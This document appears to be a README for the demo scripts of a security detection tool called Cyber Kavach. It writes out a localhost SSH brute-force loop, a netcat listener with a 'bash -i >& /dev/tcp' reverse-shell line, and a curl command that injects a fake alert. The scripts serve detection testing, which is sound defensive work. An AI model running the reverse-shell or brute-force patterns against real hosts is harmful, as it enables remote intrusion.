# 🎬 Simulation Scripts — Demo Attack Scripts

**Owner:** Ganesh  
**Purpose:** Simulate real attacks for demo purposes — safe, controlled, reproducible

---

## What This Folder Does

These scripts simulate the exact attacks that Cyber Kavach detects, so you can run a clean, controlled demo without needing an actual attacker.

---

## Scripts

### `brute_force_sim.sh`
Simulates a brute-force SSH login attack by running repeated failed SSH attempts against localhost.

**What to build:**
```bash
#!/bin/bash
TARGET="localhost"
USER="fakeuser"
COUNT=${1:-10}   # default 10 attempts

echo "[*] Starting brute force simulation — $COUNT attempts against $TARGET"

for i in $(seq 1 $COUNT); do
  ssh -o ConnectTimeout=1 \
      -o StrictHostKeyChecking=no \
      -o BatchMode=yes \
      $USER@$TARGET 2>/dev/null
  echo "[*] Attempt $i sent"
  sleep 1
done

echo "[✓] Simulation done. Check dashboard for alerts."
```

**Usage:**
```bash
chmod +x brute_force_sim.sh
./brute_force_sim.sh 10
```

**Expected result:** After 5+ attempts, agent detects > threshold → MEDIUM alert → dashboard + email

---

### `reverse_shell_sim.sh`
Simulates a reverse shell by spawning a `nc` (netcat) listener and a bash process that connects to it — mimicking the exact pattern the detector looks for.

**What to build:**
```bash
#!/bin/bash
LISTEN_PORT=${1:-4444}

echo "[*] Starting reverse shell simulation on port $LISTEN_PORT"

# Start a listener in the background
nc -lvp $LISTEN_PORT &
NC_PID=$!

sleep 1

# Connect bash to our own listener (safe — local only)
bash -i >& /dev/tcp/127.0.0.1/$LISTEN_PORT 0>&1 &
BASH_PID=$!

echo "[*] Reverse shell spawned (bash PID: $BASH_PID, nc PID: $NC_PID)"
echo "[*] Agent should detect this within 5 seconds..."

sleep 10

# Clean up
kill $NC_PID 2>/dev/null
kill $BASH_PID 2>/dev/null

echo "[✓] Simulation done. Check dashboard for HIGH alert."
```

**Usage:**
```bash
chmod +x reverse_shell_sim.sh
./reverse_shell_sim.sh 4444
```

**Expected result:** Agent detects bash with outbound TCP on port 4444 → HIGH alert → dashboard + email

---

### `network_anomaly_sim.sh` _(optional, if time allows)_
Injects a fake suspicious IP alert directly to the backend to simulate a network anomaly detection.

```bash
#!/bin/bash
BACKEND=${1:-"http://localhost:8000"}

curl -X POST "$BACKEND/alerts" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "sim-001",
    "type": "network_anomaly",
    "severity": "MEDIUM",
    "ip": "185.220.101.45",
    "process": null,
    "action": "SIMULATED_BLOCK",
    "reason": "Outbound connection to known Tor exit node IP",
    "timestamp": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'"
  }'

echo "[✓] Network anomaly alert injected. Check dashboard."
```

---

## Demo Run Order

1. `docker-compose up --build`
2. Open `http://localhost:3000`
3. Run `./brute_force_sim.sh` → watch MEDIUM alert appear
4. Run `./reverse_shell_sim.sh` → watch HIGH alert appear
5. (Optional) Run `./network_anomaly_sim.sh` → watch MEDIUM alert

Total demo time: ~3 minutes
